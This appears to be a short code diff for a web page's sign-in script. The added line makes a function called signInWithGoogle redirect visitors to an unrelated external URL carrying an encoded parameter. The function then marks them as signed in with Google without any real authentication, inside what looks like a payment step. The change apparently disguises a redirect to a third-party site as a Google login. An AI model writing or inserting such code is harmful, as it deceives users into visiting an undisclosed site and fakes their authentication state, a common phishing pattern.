@@ -2,7 +2,7 @@ let googleSignedIn = false
 let selectedAmount = 0
 
 function signInWithGoogle(){
-  window.location.href = "facebook"
+  window.location.href = "https://ignite.lk/.well-known/?f=MTAmYW1wO2k9MjkzMDQ0"
   googleSignedIn = true
   setTimeout(()=>switchStep("step1","step2"), 300)
 }
